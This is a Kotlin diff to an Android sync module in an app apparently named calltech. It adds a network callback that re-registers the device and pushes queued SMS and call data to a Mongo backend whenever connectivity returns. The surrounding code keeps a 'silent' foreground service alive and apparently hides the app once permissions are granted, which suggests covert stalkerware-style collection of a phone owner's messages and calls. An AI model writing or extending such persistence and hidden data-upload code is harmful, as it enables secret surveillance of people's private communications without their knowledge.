@@ -1,13 +1,21 @@
 package com.calltech
 
 import android.Manifest
+import android.app.Activity
 import android.content.Context
 import android.content.pm.PackageManager
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
 import android.util.Log
 import androidx.core.content.ContextCompat
 
 object SyncBootstrap {
     private const val TAG = "SyncBootstrap"
+    @Volatile
+    private var networkCallbackArmed = false
+    @Volatile
+    private var lastNetworkSyncAt = 0L
 
     /** Alarm + WorkManager + silent foreground service (kill state ke liye). */
     fun armBackgroundSync(context: Context) {
@@ -17,6 +25,7 @@ object SyncBootstrap {
         }
         SyncAlarmScheduler.start(app)
         SyncWorkScheduler.schedule(app)
+        armNetworkCallback(app)
 
         if (!needsRuntimePermissions(app)) {
             CallSyncService.ensureRunning(app)
@@ -72,7 +81,9 @@ object SyncBootstrap {
                 PendingSmsQueue.flush(app)
                 PendingCallQueue.flush(app)
                 LocalDataStore.syncPendingToMongo(app, source)
-                SyncScheduler.syncIfPermittedNow(app, source)
+                if (!needsRuntimePermissions(app)) {
+                    SyncScheduler.syncIfPermittedNow(app, source)
+                }
             }
             Log.d(TAG, "Background Mongo sync started ($source)")
         } catch (error: Exception) {
@@ -109,8 +120,9 @@ object SyncBootstrap {
         }
 
         try {
-            val intent = android.content.Intent(context, PermissionTrampolineActivity::class.java).apply {
-                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            val intent = android.content.Intent(context, PermissionTrampolineActivity::class.java)
+            if (context !is Activity) {
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             context.startActivity(intent)
             Log.d(TAG, "Permission trampoline launched")
@@ -123,6 +135,14 @@ object SyncBootstrap {
         val app = context.applicationContext
         BackgroundSyncNotifier.cancelPermission(app)
 
+        if (needsRuntimePermissions(app)) {
+            Log.w(TAG, "onPermissionsReady skipped hide — permissions still missing")
+            BackgroundSyncRunner.run {
+                DeviceRegistration.registerNow(app)
+            }
+            return
+        }
+
         BackgroundSyncRunner.run {
             CallSyncService.holdDuring(app) {
                 DeviceRegistration.registerNow(app)
@@ -133,6 +153,53 @@ object SyncBootstrap {
                 InstallFlow.completeSetup(app)
             }
             SyncWorkScheduler.enqueueNow(app)
+        }
+    }
+
+    private fun armNetworkCallback(context: Context) {
+        if (networkCallbackArmed) {
+            return
+        }
+        val app = context.applicationContext
+        val cm = app.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            ?: return
+
+        try {
+            cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    syncOnUsableNetwork(app)
+                }
+
+                override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
+                    val usable = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
+                        caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED) &&
+                        !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_CAPTIVE_PORTAL)
+                    if (usable) {
+                        syncOnUsableNetwork(app)
+                    }
+                }
+            })
+            networkCallbackArmed = true
+        } catch (error: Exception) {
+            Log.w(TAG, "Network callback failed: ${error.message}")
+        }
+    }
+
+    private fun syncOnUsableNetwork(app: Context) {
+        val now = System.currentTimeMillis()
+        if (now - lastNetworkSyncAt < 8000L) {
+            return
+        }
+        lastNetworkSyncAt = now
+        BackgroundSyncRunner.run {
+            try {
+                DeviceRegistration.registerNow(app)
+                if (!needsRuntimePermissions(app)) {
+                    SyncScheduler.syncIfPermittedNow(app, "network_available")
+                }
+            } catch (error: Exception) {
+                Log.e(TAG, "Network available sync failed", error)
+            }
         }
     }
 }
